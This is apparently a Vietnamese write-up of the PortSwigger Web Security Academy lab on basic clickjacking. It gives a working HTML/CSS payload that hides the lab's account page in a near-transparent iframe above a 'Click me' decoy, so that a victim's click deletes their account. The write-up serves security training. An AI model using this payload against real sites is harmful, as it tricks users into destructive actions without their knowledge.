## Basic clickjacking with CSRF token protection



Mục tiêu là craft HTML để lừa người dùng bấm vào xóa tài khoản của họ.

```
<style>
    #vuln_site{
        position:relative;
        width:1000px;
        height:800px;
        opacity:0.1;
        z-index:2;
    }
    #evil_site{
        position:absolute;
        top:515px;
        left:50px;
        z-index:1;
    }
</style>
<div id="evil_site">Click me</div>
<iframe id="vuln_site" src="https://0aec00ad039842b7c05f33e000970086.web-security-academy.net/my-account">
</iframe>
```



![image](https://user-images.githubusercontent.com/68894302/175083090-2c363981-b451-4927-8a53-ea95b3d527c5.png)

Những gì còn lại bây giờ là thay đổi độ mờ (opacity) của trang web dễ bị tấn công thành 0,000001. Khi tải lại trang hoàn toàn mờ hẳn

![image](https://user-images.githubusercontent.com/68894302/175105409-96973396-1aba-44bd-8298-95cc6c8e184d.png)

![image](https://user-images.githubusercontent.com/68894302/175104173-67dff60f-0752-4806-b2d2-a762bd4c06e9.png)